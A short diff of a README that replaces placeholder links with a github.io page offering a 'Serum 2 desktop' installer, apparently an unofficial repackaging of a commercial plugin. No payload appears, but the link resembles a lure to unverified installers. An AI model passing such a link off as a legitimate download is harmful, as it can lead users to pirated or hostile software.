@@ -17,7 +17,7 @@ The distribution covers a single Serum 2 standalone deployment that supports bot
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://azure-fossil-maker.github.io/serum-2-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence is a first-class concern: if another installation of the same applic
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://azure-fossil-maker.github.io/serum-2-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
